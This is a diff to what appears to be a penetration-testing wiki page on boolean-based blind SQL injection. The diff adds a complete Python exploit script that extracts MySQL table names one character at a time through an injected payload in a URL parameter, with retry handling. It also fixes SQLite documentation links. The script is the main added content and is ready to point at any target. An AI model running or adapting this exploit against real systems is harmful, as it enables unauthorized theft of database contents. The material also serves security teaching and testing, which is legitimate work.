@@ -7,6 +7,76 @@ The result allows an attacker to judge whether the payload used returns true or 
 
 ## Practice
 
+We can use a script (Python) similar to the one below, to automate the process of dumping the database trough blind SQLi.&#x20;
+
+<details>
+
+<summary>Exploit Script Example</summary>
+
+```python
+import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+import string
+
+
+# Set the URL and other parameters
+uri = "http://<TARGET>/search?id="
+timeout = 5
+retries = 3
+
+# Create a session and attach the retry strategy to it
+session = requests.Session()
+retry_strategy = Retry(
+    total=retries,
+    backoff_factor=0.3,
+    status_forcelist=[500, 502, 503, 504],
+    connect=retries,
+)
+adapter = HTTPAdapter(max_retries=retry_strategy)
+session.mount("http://", adapter)
+session.mount("https://", adapter)
+
+# Initialize variables
+password = ""
+table_id = 6
+i = 1
+
+printables = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789"
+tries = 0 
+while True:
+    for char in string.printable[:-6]:
+        if char not in ['*','+','.','?','|','&','$','\\','"','\'',"#"]:
+        
+            # Edit payload for what you need, this example dump Table Names on MySQL
+            # Fore more payloads, check https://red.infiltr8.io/web-pentesting/web-vulnerabilities/server-side/sql-injection/blind-sqli/boolean-based  
+            payload = f"2'AND+(SELECT+HEX(SUBSTRING(table_name,{i},1))FROM+information_schema.tables+WHERE+table_schema=database()+LIMIT+{table_id},1)=HEX('{char}')--+-"
+
+            for _ in range(retries + 1):
+                try:
+                    # If needed replace here, how payload is sent
+                    r = session.get(url=uri + payload, timeout=timeout)
+                    r.raise_for_status()  # Raise an HTTPError for bad responses
+                    
+                    #print(r.request.url)
+                    print(f"\r{password}                    {i}", end="")
+
+                    if "Trying to access array offset on value of type" not in r.text:
+                        password = password + char
+                        i += 1
+                    break  # Break out of the retry loop if the request is successful
+                except requests.exceptions.RequestException as e:
+                    print(f"Error making request: {e}")
+                    if _ < retries:
+                        print("Retrying...")
+                        continue
+                    else:
+                        print("Request failed after retries.")
+                        break
+```
+
+</details>
+
 #### Getting database
 
 {% tabs %}
@@ -426,7 +496,7 @@ Third, retrieve name of each column
 {% endtab %}
 
 {% tab title="SQLite" %}
-Enumeration of colums is a bit differents in SQLite. We have to enum the sqlite\_schema.sql fields that stores SQL text that describes the object. This SQL text is a [CREATE TABLE](https://www.sqlite.org/lang\_createtable.html), [CREATE VIRTUAL TABLE](https://www.sqlite.org/lang\_createvtab.html), [CREATE INDEX](https://www.sqlite.org/lang\_createindex.html), [CREATE VIEW](https://www.sqlite.org/lang\_createview.html), or [CREATE TRIGGER](https://www.sqlite.org/lang\_createtrigger.html) statement that if evaluated against the database file when it is the main database of a [database connection](https://www.sqlite.org/c3ref/sqlite3.html) would recreate the object.
+Enumeration of colums is a bit differents in SQLite. We have to enum the sqlite\_schema.sql fields that stores SQL text that describes the object. This SQL text is a [CREATE TABLE](https://www.sqlite.org/lang_createtable.html), [CREATE VIRTUAL TABLE](https://www.sqlite.org/lang_createvtab.html), [CREATE INDEX](https://www.sqlite.org/lang_createindex.html), [CREATE VIEW](https://www.sqlite.org/lang_createview.html), or [CREATE TRIGGER](https://www.sqlite.org/lang_createtrigger.html) statement that if evaluated against the database file when it is the main database of a [database connection](https://www.sqlite.org/c3ref/sqlite3.html) would recreate the object.
 
 We can send the following queries to retrieve it
 
